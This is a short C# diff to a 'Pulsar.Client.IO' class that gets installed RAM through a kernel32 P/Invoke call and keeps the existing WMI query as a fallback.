@@ -163,6 +163,21 @@ namespace Pulsar.Client.IO
         {
             try
             {
+                // Use P/Invoke to kernel32.dll for memory info (more reliable than WMI)
+                ulong totalMemoryKB = 0;
+                if (GetPhysicallyInstalledSystemMemory(out totalMemoryKB))
+                {
+                    return (int)(totalMemoryKB / 1024); // KB to MB
+                }
+            }
+            catch
+            {
+                // Ignore P/Invoke failure
+            }
+
+            // Fallback to WMI
+            try
+            {
                 int installedRAM = 0;
                 string query = "Select * From Win32_ComputerSystem";
 
@@ -183,6 +198,9 @@ namespace Pulsar.Client.IO
                 return -1;
             }
         }
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool GetPhysicallyInstalledSystemMemory(out ulong totalMemoryInKilobytes);
 
         private static string GetGpuName()
         {
